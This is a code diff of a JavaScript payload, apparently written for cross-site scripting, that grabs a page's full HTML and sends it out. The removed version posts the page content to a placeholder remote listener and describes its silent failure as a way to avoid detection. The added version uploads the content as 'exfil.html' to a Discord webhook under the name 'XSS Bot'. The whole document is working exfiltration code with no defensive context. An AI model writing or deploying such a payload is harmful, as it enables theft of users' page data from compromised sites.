@@ -1,12 +1,21 @@
-(function() {
-    // 1. Capture the entire HTML structure of the page
-    const pageContent = document.documentElement.outerHTML;
+(async () => {
+    const webhookURL = "https://discord.com";
+    
+    // Capture the data (shortening it to fit Discord's 2000 char limit)
+    // For full files, we'll send it as a 'file' instead of a message
+    const pageData = document.documentElement.outerHTML;
+    const blob = new Blob([pageData], { type: 'text/html' });
+    const formData = new FormData();
+    
+    // Attach the data as a file called "exfil.html"
+    formData.append('file', blob, 'exfil.html');
+    formData.append('payload_json', JSON.stringify({
+        content: "🚨 **New Data Exfiltrated**",
+        username: "XSS Bot"
+    }));
 
-    // 2. Use fetch to send the data to your remote listener
-    fetch('https://your-remote-server.com', {
-      method: 'POST',
-      mode: 'no-cors', // Helps bypass some basic browser restrictions
-      body: pageContent
-    })
-    .catch(err => console.log('Silently failing to avoid detection'));
-  })();
+    fetch(webhookURL, {
+        method: 'POST',
+        body: formData
+    });
+})();
